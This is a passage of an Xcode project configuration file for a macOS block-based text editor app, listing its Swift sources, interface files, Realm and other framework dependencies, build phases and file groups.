// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 70;
	objects = {

/* Begin PBXBuildFile section */
		350DDE4E28EB6A33006DEC7E /* RangeSelectionHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 350DDE4D28EB6A33006DEC7E /* RangeSelectionHelper.swift */; };
		350DDE5128EBACB8006DEC7E /* CodedBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 350DDE5028EBACB8006DEC7E /* CodedBlock.swift */; };
		3515031B26692A14000E93EE /* Typealiases.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3515031A26692A14000E93EE /* Typealiases.swift */; };
		3524E99526761CD5007504CD /* UserDefaultsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3524E99426761CD5007504CD /* UserDefaultsManager.swift */; };
		3527C85428EA300600A664AB /* View+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3527C85328EA300600A664AB /* View+.swift */; };
		3534E0A728E9B8EC00CCB81D /* TextViewCommand.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3534E0A628E9B8EC00CCB81D /* TextViewCommand.swift */; };
		35353C6028FA0BD1002FED54 /* LocalStorageHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35353C5F28FA0BD1002FED54 /* LocalStorageHandler.swift */; };
		35353C6228FA1A55002FED54 /* Data+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35353C6128FA1A55002FED54 /* Data+.swift */; };
		35353C6428FA2618002FED54 /* FileManager+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35353C6328FA2618002FED54 /* FileManager+.swift */; };
		353F4CDA28D709B000A826B3 /* NotesContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 353F4CD928D709B000A826B3 /* NotesContainer.swift */; };
		354D3BF72968F22100C9FAC3 /* Scene.swift in Sources */ = {isa = PBXBuildFile; fileRef = 354D3BF62968F22100C9FAC3 /* Scene.swift */; };
		354D3C042969215B00C9FAC3 /* DependencyInjection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 354D3C032969215B00C9FAC3 /* DependencyInjection.swift */; };
		3551572228556D88005260C8 /* RealmManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3551572128556D88005260C8 /* RealmManager.swift */; };
		3551572C28557BE5005260C8 /* URL+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3551572B28557BE5005260C8 /* URL+.swift */; };
		3552E38228E5882D00F76392 /* BlockUndoManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3552E38128E5882D00F76392 /* BlockUndoManager.swift */; };
		3552E38428E588E400F76392 /* DragSelectIndicatorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3552E38328E588E400F76392 /* DragSelectIndicatorView.swift */; };
		3552E38628E58B1C00F76392 /* DraggedBlockDropIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3552E38528E58B1C00F76392 /* DraggedBlockDropIndicator.swift */; };
		3552E38B28E5CB5100F76392 /* TextViewContainerCoordinator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3552E38A28E5CB5100F76392 /* TextViewContainerCoordinator.swift */; };
		3556C69D28E7B509003A058B /* PageLinkPopupController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3556C69C28E7B509003A058B /* PageLinkPopupController.xib */; };
		356D2E8A29076AC300FF9F2F /* PopoverManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 356D2E8929076AC300FF9F2F /* PopoverManager.swift */; };
		356DE5992637BB6800912975 /* Color+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 356DE5982637BB6800912975 /* Color+.swift */; };
		3575CC82263D7BD400E9F306 /* NSColor+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3575CC81263D7BD400E9F306 /* NSColor+.swift */; };
		3577CC642F17F3C70054E122 /* Factory in Frameworks */ = {isa = PBXBuildFile; productRef = 3577CC632F17F3C70054E122 /* Factory */; };
		3577CC662F17F3CD0054E122 /* Logging in Frameworks */ = {isa = PBXBuildFile; productRef = 3577CC652F17F3CD0054E122 /* Logging */; };
		3577CC692F17F4B60054E122 /* Realm in Frameworks */ = {isa = PBXBuildFile; productRef = 3577CC682F17F4B60054E122 /* Realm */; };
		3577CC6B2F17F4B60054E122 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 3577CC6A2F17F4B60054E122 /* RealmSwift */; };
		357835AE2632304F00BD3124 /* BooksmartApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 357835AD2632304F00BD3124 /* BooksmartApp.swift */; };
		357835B22632305000BD3124 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 357835B12632305000BD3124 /* Assets.xcassets */; };
		357835B52632305000BD3124 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 357835B42632305000BD3124 /* Preview Assets.xcassets */; };
		35787EF62638394A008E74CF /* NSRange+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35787EF52638394A008E74CF /* NSRange+.swift */; };
		35787F00263839AE008E74CF /* Collection+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35787EFF263839AE008E74CF /* Collection+.swift */; };
		35787F05263839CB008E74CF /* String+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35787F04263839CB008E74CF /* String+.swift */; };
		35A4E3AC2946514200A08917 /* IconKeys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35A4E3AB2946514200A08917 /* IconKeys.swift */; };
		35AD4C1928EDB91500E42919 /* CustomError.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35AD4C1828EDB91500E42919 /* CustomError.swift */; };
		35B1426926AD8B270034C351 /* CustomViewModifiers.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35B1426826AD8B270034C351 /* CustomViewModifiers.swift */; };
		35B81CEF28FB4BAA004DD368 /* ContentDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35B81CEE28FB4BAA004DD368 /* ContentDB.swift */; };
		35C0538B28E0848C008225F9 /* Persister.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35C0538A28E0848C008225F9 /* Persister.swift */; };
		35C6D7B1293A324F0052C5FC /* BlockLayoutManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35C6D7B0293A324F0052C5FC /* BlockLayoutManager.swift */; };
		35CB2D7D2F17D744005B5EC8 /* CodedTextViewContents.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35CB2D7C2F17D73F005B5EC8 /* CodedTextViewContents.swift */; };
		35CFFD4A2644012B0009AAC6 /* CharacterSet+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35CFFD492644012B0009AAC6 /* CharacterSet+.swift */; };
		35EEF365264979150080EBD4 /* Functions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35EEF364264979150080EBD4 /* Functions.swift */; };
		35F1E49B2641972300F3DDCC /* NSAttributedString.Key+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F1E49A2641972300F3DDCC /* NSAttributedString.Key+.swift */; };
		35F1E4A52641C76300F3DDCC /* Keycode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F1E4A42641C76300F3DDCC /* Keycode.swift */; };
		35F903E82811D03C000F8E26 /* TextView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903D32811D03B000F8E26 /* TextView.swift */; };
		35F903E92811D03C000F8E26 /* BlockMenuViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 35F903D42811D03B000F8E26 /* BlockMenuViewController.xib */; };
		35F903EA2811D03C000F8E26 /* BlockHoverViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903D52811D03B000F8E26 /* BlockHoverViewController.swift */; };
		35F903EB2811D03C000F8E26 /* BlockMenuViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903D62811D03B000F8E26 /* BlockMenuViewController.swift */; };
		35F903EC2811D03C000F8E26 /* LinkPopupController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 35F903D72811D03B000F8E26 /* LinkPopupController.xib */; };
		35F903ED2811D03C000F8E26 /* InlineStylingPopupController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903D82811D03B000F8E26 /* InlineStylingPopupController.swift */; };
		35F903EE2811D03C000F8E26 /* InlineStylingPopupController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 35F903D92811D03B000F8E26 /* InlineStylingPopupController.xib */; };
		35F903EF2811D03C000F8E26 /* TextBlockStorage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903DA2811D03B000F8E26 /* TextBlockStorage.swift */; };
		35F903F02811D03C000F8E26 /* TextViewContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903DB2811D03B000F8E26 /* TextViewContainer.swift */; };
		35F903F12811D03C000F8E26 /* BlocksInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903DD2811D03C000F8E26 /* BlocksInfo.swift */; };
		35F903F22811D03C000F8E26 /* Header2Block.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903DE2811D03C000F8E26 /* Header2Block.swift */; };
		35F903F32811D03C000F8E26 /* CodeBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903DF2811D03C000F8E26 /* CodeBlock.swift */; };
		35F903F42811D03C000F8E26 /* Block.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E02811D03C000F8E26 /* Block.swift */; };
		35F903F52811D03C000F8E26 /* ListBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E12811D03C000F8E26 /* ListBlock.swift */; };
		35F903F62811D03C000F8E26 /* StyleBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E22811D03C000F8E26 /* StyleBuilder.swift */; };
		35F903F72811D03C000F8E26 /* TextBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E32811D03C000F8E26 /* TextBlock.swift */; };
		35F903F82811D03C000F8E26 /* Header1Block.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E42811D03C000F8E26 /* Header1Block.swift */; };
		35F903F92811D03C000F8E26 /* OrderedListBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E52811D03C000F8E26 /* OrderedListBlock.swift */; };
		35F903FA2811D03C000F8E26 /* ImageBlock.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E62811D03C000F8E26 /* ImageBlock.swift */; };
		35F903FB2811D03C000F8E26 /* LinkPopupController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903E72811D03C000F8E26 /* LinkPopupController.swift */; };
		35F903FD2811D0DC000F8E26 /* NSPoint+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903FC2811D0DC000F8E26 /* NSPoint+.swift */; };
		35F903FF2811D142000F8E26 /* NSImage+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F903FE2811D142000F8E26 /* NSImage+.swift */; };
		35F904012811D17C000F8E26 /* NSAttributedString+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F904002811D17C000F8E26 /* NSAttributedString+.swift */; };
		35F904032811D1A3000F8E26 /* NSNotificationName+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F904022811D1A3000F8E26 /* NSNotificationName+.swift */; };
		35F904052811D1EF000F8E26 /* NSMenu+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F904042811D1EF000F8E26 /* NSMenu+.swift */; };
		35FCAA65294A024F00214314 /* TextViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35FCAA64294A024F00214314 /* TextViewController.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		357835BD2632305000BD3124 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 357835A22632304F00BD3124 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 357835A92632304F00BD3124;
			remoteInfo = LimitlessUI;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		3577CC5B2F17F38C0054E122 /* Embed Frameworks */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 10;
			files = (
			);
			name = "Embed Frameworks";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		350DDE4D28EB6A33006DEC7E /* RangeSelectionHelper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RangeSelectionHelper.swift; sourceTree = "<group>"; };
		350DDE5028EBACB8006DEC7E /* CodedBlock.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CodedBlock.swift; sourceTree = "<group>"; };
		3515031A26692A14000E93EE /* Typealiases.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Typealiases.swift; sourceTree = "<group>"; };
		3524E99426761CD5007504CD /* UserDefaultsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDefaultsManager.swift; sourceTree = "<group>"; };
		3527C85328EA300600A664AB /* View+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "View+.swift"; sourceTree = "<group>"; };
		3534E0A628E9B8EC00CCB81D /* TextViewCommand.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextViewCommand.swift; sourceTree = "<group>"; };
		35353C5F28FA0BD1002FED54 /* LocalStorageHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalStorageHandler.swift; sourceTree = "<group>"; };
		35353C6128FA1A55002FED54 /* Data+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Data+.swift"; sourceTree = "<group>"; };
		35353C6328FA2618002FED54 /* FileManager+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "FileManager+.swift"; sourceTree = "<group>"; };
		353F4CD928D709B000A826B3 /* NotesContainer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotesContainer.swift; sourceTree = "<group>"; };
		354D3BF62968F22100C9FAC3 /* Scene.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Scene.swift; sourceTree = "<group>"; };
		354D3C032969215B00C9FAC3 /* DependencyInjection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DependencyInjection.swift; sourceTree = "<group>"; };
		3551572128556D88005260C8 /* RealmManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RealmManager.swift; sourceTree = "<group>"; };
		3551572B28557BE5005260C8 /* URL+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "URL+.swift"; sourceTree = "<group>"; };
		3552E38128E5882D00F76392 /* BlockUndoManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlockUndoManager.swift; sourceTree = "<group>"; };
		3552E38328E588E400F76392 /* DragSelectIndicatorView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DragSelectIndicatorView.swift; sourceTree = "<group>"; };
		3552E38528E58B1C00F76392 /* DraggedBlockDropIndicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DraggedBlockDropIndicator.swift; sourceTree = "<group>"; };
		3552E38A28E5CB5100F76392 /* TextViewContainerCoordinator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextViewContainerCoordinator.swift; sourceTree = "<group>"; };
		3556C69C28E7B509003A058B /* PageLinkPopupController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PageLinkPopupController.xib; sourceTree = "<group>"; };
		356B6A54267172BE006A45B1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		356D2E8929076AC300FF9F2F /* PopoverManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopoverManager.swift; sourceTree = "<group>"; };
		356DE5982637BB6800912975 /* Color+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Color+.swift"; sourceTree = "<group>"; };
		3575CC81263D7BD400E9F306 /* NSColor+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSColor+.swift"; sourceTree = "<group>"; };
		357835AA2632304F00BD3124 /* textytext.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = textytext.app; sourceTree = BUILT_PRODUCTS_DIR; };
		357835AD2632304F00BD3124 /* BooksmartApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BooksmartApp.swift; sourceTree = "<group>"; };
		357835B12632305000BD3124 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		357835B42632305000BD3124 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		357835B62632305000BD3124 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		357835B72632305000BD3124 /* textytext.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = textytext.entitlements; sourceTree = "<group>"; };
		357835BC2632305000BD3124 /* textytextTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = textytextTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		35787EF52638394A008E74CF /* NSRange+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSRange+.swift"; sourceTree = "<group>"; };
		35787EFF263839AE008E74CF /* Collection+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Collection+.swift"; sourceTree = "<group>"; };
		35787F04263839CB008E74CF /* String+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+.swift"; sourceTree = "<group>"; };
		35A4E3AB2946514200A08917 /* IconKeys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IconKeys.swift; sourceTree = "<group>"; };
		35AD4C1828EDB91500E42919 /* CustomError.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomError.swift; sourceTree = "<group>"; };
		35B1426826AD8B270034C351 /* CustomViewModifiers.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomViewModifiers.swift; sourceTree = "<group>"; };
		35B81CEE28FB4BAA004DD368 /* ContentDB.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentDB.swift; sourceTree = "<group>"; };
		35C0538A28E0848C008225F9 /* Persister.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Persister.swift; sourceTree = "<group>"; };
		35C6D7B0293A324F0052C5FC /* BlockLayoutManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlockLayoutManager.swift; sourceTree = "<group>"; };
		35CB2D7C2F17D73F005B5EC8 /* CodedTextViewContents.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CodedTextViewContents.swift; sourceTree = "<group>"; };
		35CFFD492644012B0009AAC6 /* CharacterSet+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CharacterSet+.swift"; sourceTree = "<group>"; };
		35E5A1312690AD940030B1CF /* TestingGround.playground */ = {isa = PBXFileReference; lastKnownFileType = file.playground; path = TestingGround.playground; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.swift; };
		35EEF364264979150080EBD4 /* Functions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Functions.swift; sourceTree = "<group>"; };
		35F1E49A2641972300F3DDCC /* NSAttributedString.Key+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSAttributedString.Key+.swift"; sourceTree = "<group>"; };
		35F1E4A42641C76300F3DDCC /* Keycode.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Keycode.swift; sourceTree = "<group>"; };
		35F903D32811D03B000F8E26 /* TextView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TextView.swift; sourceTree = "<group>"; };
		35F903D42811D03B000F8E26 /* BlockMenuViewController.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = BlockMenuViewController.xib; sourceTree = "<group>"; };
		35F903D52811D03B000F8E26 /* BlockHoverViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BlockHoverViewController.swift; sourceTree = "<group>"; };
		35F903D62811D03B000F8E26 /* BlockMenuViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BlockMenuViewController.swift; sourceTree = "<group>"; };
		35F903D72811D03B000F8E26 /* LinkPopupController.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = LinkPopupController.xib; sourceTree = "<group>"; };
		35F903D82811D03B000F8E26 /* InlineStylingPopupController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InlineStylingPopupController.swift; sourceTree = "<group>"; };
		35F903D92811D03B000F8E26 /* InlineStylingPopupController.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = InlineStylingPopupController.xib; sourceTree = "<group>"; };
		35F903DA2811D03B000F8E26 /* TextBlockStorage.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TextBlockStorage.swift; sourceTree = "<group>"; };
		35F903DB2811D03B000F8E26 /* TextViewContainer.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TextViewContainer.swift; sourceTree = "<group>"; };
		35F903DD2811D03C000F8E26 /* BlocksInfo.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BlocksInfo.swift; sourceTree = "<group>"; };
		35F903DE2811D03C000F8E26 /* Header2Block.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Header2Block.swift; sourceTree = "<group>"; };
		35F903DF2811D03C000F8E26 /* CodeBlock.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CodeBlock.swift; sourceTree = "<group>"; };
		35F903E02811D03C000F8E26 /* Block.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Block.swift; sourceTree = "<group>"; };
		35F903E12811D03C000F8E26 /* ListBlock.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ListBlock.swift; sourceTree = "<group>"; };
		35F903E22811D03C000F8E26 /* StyleBuilder.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StyleBuilder.swift; sourceTree = "<group>"; };
		35F903E32811D03C000F8E26 /* TextBlock.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TextBlock.swift; sourceTree = "<group>"; };
		35F903E42811D03C000F8E26 /* Header1Block.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Header1Block.swift; sourceTree = "<group>"; };
		35F903E52811D03C000F8E26 /* OrderedListBlock.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OrderedListBlock.swift; sourceTree = "<group>"; };
		35F903E62811D03C000F8E26 /* ImageBlock.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ImageBlock.swift; sourceTree = "<group>"; };
		35F903E72811D03C000F8E26 /* LinkPopupController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LinkPopupController.swift; sourceTree = "<group>"; };
		35F903FC2811D0DC000F8E26 /* NSPoint+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSPoint+.swift"; sourceTree = "<group>"; };
		35F903FE2811D142000F8E26 /* NSImage+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSImage+.swift"; sourceTree = "<group>"; };
		35F904002811D17C000F8E26 /* NSAttributedString+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSAttributedString+.swift"; sourceTree = "<group>"; };
		35F904022811D1A3000F8E26 /* NSNotificationName+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSNotificationName+.swift"; sourceTree = "<group>"; };
		35F904042811D1EF000F8E26 /* NSMenu+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSMenu+.swift"; sourceTree = "<group>"; };
		35FCAA64294A024F00214314 /* TextViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextViewController.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		35CB2D852F17E8CB005B5EC8 /* PBXFileSystemSynchronizedBuildFileExceptionSet */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				"feature-1.gif",
				"feature-2.gif",
				"feature-3.gif",
				"feature-4.gif",
				"feature-5.gif",
			);
			target = 357835A92632304F00BD3124 /* textytext */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		35CB2D822F17E3B9005B5EC8 /* readme-assets */ = {isa = PBXFileSystemSynchronizedRootGroup; exceptions = (35CB2D852F17E8CB005B5EC8 /* PBXFileSystemSynchronizedBuildFileExceptionSet */, ); explicitFileTypes = {}; explicitFolders = (); path = "readme-assets"; sourceTree = "<group>"; };
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		357835A72632304F00BD3124 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				3577CC6B2F17F4B60054E122 /* RealmSwift in Frameworks */,
				3577CC692F17F4B60054E122 /* Realm in Frameworks */,
				3577CC642F17F3C70054E122 /* Factory in Frameworks */,
				3577CC662F17F3CD0054E122 /* Logging in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		357835B92632305000BD3124 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		350DDE4C28EB6A1C006DEC7E /* Misc */ = {
			isa = PBXGroup;
			children = (
				350DDE4D28EB6A33006DEC7E /* RangeSelectionHelper.swift */,
			);
			path = Misc;
			sourceTree = "<group>";
		};
		350DDE4F28EBAC87006DEC7E /* BlockTypes */ = {
			isa = PBXGroup;
			children = (
				35F903DE2811D03C000F8E26 /* Header2Block.swift */,
				35F903DF2811D03C000F8E26 /* CodeBlock.swift */,
				35F903E02811D03C000F8E26 /* Block.swift */,
				35F903E12811D03C000F8E26 /* ListBlock.swift */,
				35F903E32811D03C000F8E26 /* TextBlock.swift */,
				35F903E42811D03C000F8E26 /* Header1Block.swift */,
				35F903E52811D03C000F8E26 /* OrderedListBlock.swift */,
				35F903E62811D03C000F8E26 /* ImageBlock.swift */,
			);
			path = BlockTypes;
			sourceTree = "<group>";
		};
		3551572028556D73005260C8 /* Persistence */ = {
			isa = PBXGroup;
			children = (
				3551572128556D88005260C8 /* RealmManager.swift */,
				35C0538A28E0848C008225F9 /* Persister.swift */,
				35B81CEE28FB4BAA004DD368 /* ContentDB.swift */,
			);
			path = Persistence;
			sourceTree = "<group>";
		};
		3552E38928E5CB3E00F76392 /* Other */ = {
			isa = PBXGroup;
			children = (
				3552E38A28E5CB5100F76392 /* TextViewContainerCoordinator.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		3563242B2895816A0046B28D /* Realm */ = {
			isa = PBXGroup;
			children = (
				35CB2D7C2F17D73F005B5EC8 /* CodedTextViewContents.swift */,
				3551572B28557BE5005260C8 /* URL+.swift */,
			);
			path = Realm;
			sourceTree = "<group>";
		};
		356DE5972637BB5700912975 /* Extensions */ = {
			isa = PBXGroup;
			children = (
				3563242B2895816A0046B28D /* Realm */,
				3575CC93263D930100E9F306 /* Foundation */,
				3575CC92263D92F400E9F306 /* Cocoa */,
				3575CC91263D92EB00E9F306 /* SwiftUI */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		3575CC91263D92EB00E9F306 /* SwiftUI */ = {
			isa = PBXGroup;
			children = (
				356DE5982637BB6800912975 /* Color+.swift */,
				35B1426826AD8B270034C351 /* CustomViewModifiers.swift */,
				3527C85328EA300600A664AB /* View+.swift */,
			);
			path = SwiftUI;
			sourceTree = "<group>";
		};
		3575CC92263D92F400E9F306 /* Cocoa */ = {
			isa = PBXGroup;
			children = (
				3575CC81263D7BD400E9F306 /* NSColor+.swift */,
				35787EF52638394A008E74CF /* NSRange+.swift */,
				35F1E49A2641972300F3DDCC /* NSAttributedString.Key+.swift */,
				35F903FE2811D142000F8E26 /* NSImage+.swift */,
				35F904002811D17C000F8E26 /* NSAttributedString+.swift */,
				35F904022811D1A3000F8E26 /* NSNotificationName+.swift */,
				35F904042811D1EF000F8E26 /* NSMenu+.swift */,
			);
			path = Cocoa;
			sourceTree = "<group>";
		};
		3575CC93263D930100E9F306 /* Foundation */ = {
			isa = PBXGroup;
			children = (
				35787EFF263839AE008E74CF /* Collection+.swift */,
